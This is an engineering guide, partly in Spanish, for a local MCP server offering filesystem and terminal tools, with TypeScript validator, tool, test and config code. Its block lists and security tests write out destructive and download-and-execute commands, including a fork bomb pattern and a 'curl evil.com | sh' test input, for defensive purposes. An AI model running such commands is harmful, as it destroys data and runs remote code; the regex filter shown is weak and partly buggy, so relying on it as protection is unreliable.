# ABSD DevOps MCP Server - Engineering Guide
**Replacement para Desktop Commander | Local-first | Production-grade**

## Decisión Arquitectónica

**Stack:** TypeScript (strict) + Node.js 22+ + `@modelcontextprotocol/sdk`

**Transporte:** stdio (local, simple, secure por defecto)

**Target:** `/Users/anthonybir/Projects/ABSD_mcp`

---

## 1. Core Architecture

### Estructura del Proyecto
```
ABSD_mcp/
├── src/
│   ├── index.ts              # Entry point + stdio transport
│   ├── server.ts             # McpServer setup + tool registration
│   ├── tools/
│   │   ├── filesystem/
│   │   │   ├── read.ts       # read_file, list_directory
│   │   │   ├── write.ts      # write_file, create_directory
│   │   │   ├── edit.ts       # edit_block (surgical edits)
│   │   │   └── search.ts     # ripgrep wrapper for code search
│   │   └── terminal/
│   │       ├── process.ts    # start_process, interact
│   │       ├── session.ts    # Session state management
│   │       └── pty.ts        # node-pty wrapper
│   ├── security/
│   │   ├── validator.ts      # Path validation + command filtering
│   │   └── config.ts         # Allowlist management
│   ├── types/
│   │   └── index.ts          # Shared types + Zod schemas
│   └── utils/
│       ├── logger.ts         # Structured logging (pino)
│       └── errors.ts         # McpError wrappers
├── tests/
│   ├── unit/
│   ├── integration/
│   └── security/             # Path traversal, injection tests
├── package.json
├── tsconfig.json
└── README.md
```

### Stack Decisions

**Libraries:**
- `@modelcontextprotocol/sdk@latest` - Official SDK, battle-tested
- `zod@^3.24` - Schema validation, integra perfecto con SDK
- `node-pty@^1.0` - Cross-platform PTY for terminal sessions
- `pino@^9.0` - High-performance structured logging
- `tsup@^8.0` - Bundle TypeScript → executable

**Build:**
```json
{
  "scripts": {
    "build": "tsup src/index.ts --format esm --clean --minify",
    "dev": "tsx watch src/index.ts",
    "test": "vitest",
    "test:security": "vitest --grep security",
    "lint": "eslint src --ext ts",
    "type-check": "tsc --noEmit"
  }
}
```

---

## 2. Security Layer (Priority #1)

### Path Validation Pattern
```typescript
// src/security/validator.ts
import { resolve, normalize, relative, sep } from 'node:path';
import { realpath, access } from 'node:fs/promises';
import { McpError, ErrorCode } from '@modelcontextprotocol/sdk';

export class SecurityValidator {
  private allowedDirs: Set<string>;

  constructor(allowedDirs: string[]) {
    // Resolve and normalize all allowed directories at startup
    this.allowedDirs = new Set(
      allowedDirs.map(dir => resolve(normalize(dir)))
    );
  }

  async validatePath(requestedPath: string): Promise<string> {
    try {
      // 1. Resolve absolute path (handles .., ~, symlinks)
      const absolutePath = resolve(normalize(requestedPath));
      
      // 2. Get real path (follows symlinks)
      const realPath = await realpath(absolutePath);
      
      // 3. Check if path is within ANY allowed directory
      const isAllowed = Array.from(this.allowedDirs).some(allowedDir => {
        const rel = relative(allowedDir, realPath);
        // Path is inside if relative path doesn't start with .. or /
        return !rel.startsWith('..') && !rel.startsWith(sep);
      });

      if (!isAllowed) {
        throw new McpError(
          ErrorCode.InvalidRequest,
          `Path outside allowed directories: ${requestedPath}`,
          { requestedPath, allowedDirs: Array.from(this.allowedDirs) }
        );
      }

      // 4. Verify path exists and is accessible
      await access(realPath);
      
      return realPath;
      
    } catch (error) {
      if (error instanceof McpError) throw error;
      
      throw new McpError(
        ErrorCode.InvalidRequest,
        'Invalid or inaccessible path',
        { requestedPath, error: String(error) }
      );
    }
  }

  // Command validation for terminal operations
  validateCommand(command: string): boolean {
    const blockedPatterns = [
      /rm\s+-rf\s+\//, // Destructive operations
      /:\s*\(\)\s*\{\s*:\|\:&\s*\}/, // Fork bombs
      /eval\s*\(/,  // Code injection
      /exec\s*\(/,
      /curl.*\|\s*sh/, // Download+execute
    ];

    return !blockedPatterns.some(pattern => pattern.test(command));
  }
}
```

**Uso:**
```typescript
// Every filesystem operation starts with:
const validPath = await validator.validatePath(userPath);
// Now use validPath safely
```

---

## 3. Filesystem Tools

### Read Operations (with chunking)
```typescript
// src/tools/filesystem/read.ts
import { readFile } from 'node:fs/promises';
import { z } from 'zod';

const ReadFileSchema = z.object({
  path: z.string(),
  offset: z.number().default(0),
  length: z.number().default(1000), // Configurable limit
});

export async function readFileTool(
  args: z.infer<typeof ReadFileSchema>,
  validator: SecurityValidator
) {
  const validPath = await validator.validatePath(args.path);
  
  const content = await readFile(validPath, 'utf-8');
  const lines = content.split('\n');
  
  // Handle offset (negative = tail)
  const startIdx = args.offset < 0 
    ? Math.max(0, lines.length + args.offset)
    : args.offset;
  
  const chunk = lines.slice(startIdx, startIdx + args.length);
  
  return {
    content: [{
      type: 'text' as const,
      text: chunk.join('\n'),
    }],
    structuredContent: {
      path: validPath,
      totalLines: lines.length,
      returnedLines: chunk.length,
      offset: startIdx,
    },
  };
}
```

### Write Operations (append support)
```typescript
// src/tools/filesystem/write.ts
const WriteFileSchema = z.object({
  path: z.string(),
  content: z.string(),
  mode: z.enum(['rewrite', 'append']).default('rewrite'),
});

export async function writeFileTool(
  args: z.infer<typeof WriteFileSchema>,
  validator: SecurityValidator
) {
  const validPath = await validator.validatePath(args.path);
  
  // Warn if content exceeds recommended chunk size
  const lines = args.content.split('\n').length;
  if (lines > 50) {
    logger.warn({ path: validPath, lines }, 'Large write operation');
  }
  
  const flags = args.mode === 'append' ? 'a' : 'w';
  await writeFile(validPath, args.content, { flag: flags });
  
  return {
    content: [{ 
      type: 'text' as const, 
      text: `Written ${lines} lines to ${basename(validPath)}` 
    }],
    structuredContent: { path: validPath, lines, mode: args.mode },
  };
}
```

### Search (ripgrep integration)
```typescript
// src/tools/filesystem/search.ts
import { spawn } from 'node:child_process';

const SearchSchema = z.object({
  pattern: z.string(),
  path: z.string(),
  literalSearch: z.boolean().default(false),
  filePattern: z.string().optional(), // e.g., "*.ts"
  maxResults: z.number().default(100),
});

export async function searchTool(
  args: z.infer<typeof SearchSchema>,
  validator: SecurityValidator
) {
  const validPath = await validator.validatePath(args.path);
  
  const rgArgs = [
    args.literalSearch ? '-F' : '', // Fixed strings (literal)
    '-n', // Line numbers
    '--json', // Structured output
    args.filePattern ? `-g ${args.filePattern}` : '',
    args.pattern,
    validPath,
  ].filter(Boolean);
  
  return new Promise((resolve, reject) => {
    const rg = spawn('rg', rgArgs);
    let output = '';
    
    rg.stdout.on('data', (data) => { output += data; });
    rg.on('close', (code) => {
      if (code === 0 || code === 1) { // 1 = no matches (not error)
        const matches = output.split('\n')
          .filter(Boolean)
          .map(line => JSON.parse(line))
          .slice(0, args.maxResults);
        
        resolve({
          content: [{ 
            type: 'text' as const, 
            text: formatMatches(matches) 
          }],
          structuredContent: { matches, count: matches.length },
        });
      } else {
        reject(new McpError(
          ErrorCode.InternalError,
          'Search failed',
          { code, pattern: args.pattern }
        ));
      }
    });
  });
}
```

---

## 4. Terminal Session Management

### Process State
```typescript
// src/tools/terminal/session.ts
interface ProcessSession {
  pid: number;
  ptyProcess: IPty;
  outputBuffer: string[];
  createdAt: Date;
  lastActivity: Date;
  shell: string;
}

class SessionManager {
  private sessions = new Map<number, ProcessSession>();
  
  create(shell: string = 'zsh'): ProcessSession {
    const ptyProcess = spawn(shell, [], {
      name: 'xterm-256color',
      cols: 120,
      rows: 30,
      cwd: process.env.HOME,
      env: process.env,
    });

    const session: ProcessSession = {
      pid: ptyProcess.pid,
      ptyProcess,
      outputBuffer: [],
      createdAt: new Date(),
      lastActivity: new Date(),
      shell,
    };

    // Capture output
    ptyProcess.onData((data) => {
      session.outputBuffer.push(data);
      session.lastActivity = new Date();
    });

    this.sessions.set(ptyProcess.pid, session);
    return session;
  }

  get(pid: number): ProcessSession | undefined {
    return this.sessions.get(pid);
  }

  terminate(pid: number): void {
    const session = this.sessions.get(pid);
    if (session) {
      session.ptyProcess.kill();
      this.sessions.delete(pid);
    }
  }

  // Cleanup stale sessions (>30min idle)
  cleanupStale(): void {
    const now = Date.now();
    for (const [pid, session] of this.sessions) {
      const idle = now - session.lastActivity.getTime();
      if (idle > 30 * 60 * 1000) {
        this.terminate(pid);
      }
    }
  }
}
```

### Interactive Process Tool
```typescript
// src/tools/terminal/process.ts
const InteractSchema = z.object({
  pid: z.number(),
  input: z.string(),
  timeout: z.number().default(8000),
});

export async function interactWithProcess(
  args: z.infer<typeof InteractSchema>,
  sessionManager: SessionManager
) {
  const session = sessionManager.get(args.pid);
  if (!session) {
    throw new McpError(
      ErrorCode.InvalidRequest,
      'Process not found',
      { pid: args.pid }
    );
  }

  // Clear buffer before sending command
  session.outputBuffer = [];
  
  // Send command (add \r for REPL prompts)
  session.ptyProcess.write(args.input + '\r');

  // Wait for output with smart detection
  return new Promise((resolve) => {
    const startTime = Date.now();
    
    const checkOutput = () => {
      const elapsed = Date.now() - startTime;
      const output = session.outputBuffer.join('');
      
      // Early exit conditions
      const hasPrompt = />>>|>|\$|#/.test(output.slice(-50));
      const hasError = /error|exception|traceback/i.test(output);
      
      if (hasPrompt || hasError || elapsed > args.timeout) {
        resolve({
          content: [{ 
            type: 'text' as const, 
            text: output 
          }],
          structuredContent: {
            pid: args.pid,
            output,
            elapsed,
            status: hasError ? 'error' : hasPrompt ? 'ready' : 'timeout',
          },
        });
      } else {
        setTimeout(checkOutput, 100); // Poll every 100ms
      }
    };
    
    setTimeout(checkOutput, 100);
  });
}
```

---

## 5. Error Handling Pattern

### Custom Error Types
```typescript
// src/utils/errors.ts
import { McpError, ErrorCode } from '@modelcontextprotocol/sdk';

export function wrapError(error: unknown, context: string): McpError {
  if (error instanceof McpError) return error;
  
  return new McpError(
    ErrorCode.InternalError,
    `${context}: ${String(error)}`,
    { originalError: error instanceof Error ? error.message : String(error) }
  );
}

// Usage in tools
export async function someTool(args: SomeSchema) {
  try {
    // ... operation
    return { content: [...], isError: false };
  } catch (error) {
    const mcpError = wrapError(error, 'someTool');
    return {
      content: [{ 
        type: 'text' as const, 
        text: `Error: ${mcpError.message}` 
      }],
      isError: true,
    };
  }
}
```

### Retry Pattern (for external services)
```typescript
async function withRetry<T>(
  operation: () => Promise<T>,
  maxAttempts = 3
): Promise<T> {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      return await operation();
    } catch (error) {
      if (attempt === maxAttempts) throw error;
      
      const delay = Math.pow(2, attempt) * 1000 + Math.random() * 1000;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
  throw new Error('Unreachable'); // TypeScript safety
}
```

---

## 6. Testing Strategy

### Unit Tests (vitest)
```typescript
// tests/unit/validator.test.ts
import { describe, it, expect, beforeEach } from 'vitest';
import { SecurityValidator } from '@/security/validator';

describe('SecurityValidator', () => {
  let validator: SecurityValidator;
  
  beforeEach(() => {
    validator = new SecurityValidator(['/tmp/test']);
  });

  it('allows paths within allowed directory', async () => {
    const valid = await validator.validatePath('/tmp/test/file.txt');
    expect(valid).toContain('/tmp/test/file.txt');
  });

  it('rejects path traversal attempts', async () => {
    await expect(
      validator.validatePath('/tmp/test/../../../etc/passwd')
    ).rejects.toThrow('Path outside allowed directories');
  });

  it('rejects symlinks pointing outside', async () => {
    // Assuming /tmp/test/evil -> /etc/passwd
    await expect(
      validator.validatePath('/tmp/test/evil')
    ).rejects.toThrow();
  });
});
```

### Integration Tests
```typescript
// tests/integration/filesystem.test.ts
describe('Filesystem Tools Integration', () => {
  it('reads and writes files end-to-end', async () => {
    const testPath = '/tmp/test/integration.txt';
    
    // Write
    await writeFileTool({
      path: testPath,
      content: 'test content',
      mode: 'rewrite',
    }, validator);
    
    // Read
    const result = await readFileTool({
      path: testPath,
      offset: 0,
      length: 100,
    }, validator);
    
    expect(result.content[0].text).toContain('test content');
  });
});
```

### Security Tests
```typescript
// tests/security/injection.test.ts
describe('Security: Command Injection', () => {
  it('blocks command chaining in paths', async () => {
    await expect(
      validator.validatePath('/tmp/test; rm -rf /')
    ).rejects.toThrow();
  });

  it('blocks shell expansion patterns', async () => {
    await expect(
      validator.validateCommand('$(curl evil.com | sh)')
    ).toBe(false);
  });
});
```

---

## 7. Configuration

### Config File (Zod-validated)
```typescript
// src/security/config.ts
import { z } from 'zod';

const ConfigSchema = z.object({
  allowedDirectories: z.array(z.string()).min(1),
  blockedCommands: z.array(z.string()).default([]),
  fileReadLineLimit: z.number().default(1000),
  fileWriteLineLimit: z.number().default(50),
  sessionTimeout: z.number().default(30 * 60 * 1000), // 30min
  logLevel: z.enum(['debug', 'info', 'warn', 'error']).default('info'),
});

export type Config = z.infer<typeof ConfigSchema>;

export function loadConfig(): Config {
  const configPath = process.env.ABSD_MCP_CONFIG || './config.json';
  const raw = readFileSync(configPath, 'utf-8');
  return ConfigSchema.parse(JSON.parse(raw));
}
```

### Example config.json
```json
{
  "allowedDirectories": [
    "/Users/anthonybir/Projects",
    "/Users/anthonybir/Documents"
  ],
  "blockedCommands": [
    "rm -rf /",
    "dd if=/dev/zero"
  ],
  "fileReadLineLimit": 2000,
  "fileWriteLineLimit": 75,
  "logLevel": "info"
}
```

---

## 8. Distribution

### package.json (npm package)
```json
{
  "name": "@absd/devops-mcp",
  "version": "0.1.0",
  "description": "ABSD DevOps MCP Server - Local filesystem & terminal operations",
  "type": "module",
  "main": "dist/index.js",
  "bin": {
    "absd-mcp": "./dist/index.js"
  },
  "files": ["dist", "README.md", "config.example.json"],
  "scripts": {
    "build": "tsup src/index.ts --format esm --clean --minify",
    "prepublishOnly": "pnpm test && pnpm build"
  },
  "keywords": ["mcp", "devops", "filesystem", "terminal", "absd"],
  "author": "Anthony Bir <anthonybir@aena.edu.py>",
  "license": "MIT",
  "engines": {
    "node": ">=22.0.0"
  }
}
```

### Claude Desktop Config
```json
{
  "mcpServers": {
    "absd-devops": {
      "command": "npx",
      "args": ["-y", "@absd/devops-mcp@latest"],
      "env": {
        "ABSD_MCP_CONFIG": "/Users/anthonybir/.config/absd-mcp/config.json"
      }
    }
  }
}
```

---

## 9. Timeline & Milestones

### Semana 1: Core + Filesystem
- **Día 1-2:** Project setup, security validator, config system
- **Día 3-4:** Filesystem tools (read/write/list)
- **Día 5:** Tests unitarios + security tests
- **Entregable:** MCP server básico funcional con filesystem seguro

### Semana 2: Terminal + Process
- **Día 1-2:** SessionManager + node-pty integration
- **Día 3-4:** start_process, interact_with_process tools
- **Día 5:** Integration tests para PTY sessions
- **Entregable:** Terminal management completo

### Semana 3: Advanced + Polish
- **Día 1-2:** Search tool (ripgrep), edit_block (surgical edits)
- **Día 3:** Error handling refinement, logging
- **Día 4:** Performance testing, optimization
- **Día 5:** Documentation
- **Entregable:** Feature-complete server

### Semana 4: Distribution
- **Día 1-2:** Build pipeline, package prep
- **Día 3:** npm publish, testing downstream
- **Día 4-5:** User testing, bug fixes
- **Entregable:** `@absd/devops-mcp` publicado en npm

---

## 10. Next Steps (Ahora)

1. **Initialize project:**
   ```bash
   cd /Users/anthonybir/Projects/ABSD_mcp
   pnpm init
   pnpm add @modelcontextprotocol/sdk zod node-pty pino
   pnpm add -D typescript @types/node tsup vitest
   ```

2. **Scaffold structure:**
   ```bash
   mkdir -p src/{tools/{filesystem,terminal},security,types,utils} tests/{unit,integration,security}
   ```

3. **Start with security validator** (crítico primero):
   - Implement `SecurityValidator` class
   - Write comprehensive path traversal tests
   - Validate on macOS paths specifically

4. **Basic filesystem tools:**
   - `read_file` → test with chunking
   - `write_file` → test append mode
   - `list_directory` → recursive option

5. **Setup MCP Inspector testing:**
   ```bash
   npx @modelcontextprotocol/inspector tsx src/index.ts
   ```

**¿Quieres que arranque con el scaffolding y el código del security validator, o preferís primero revisar/ajustar algún aspecto de esta arquitectura?**
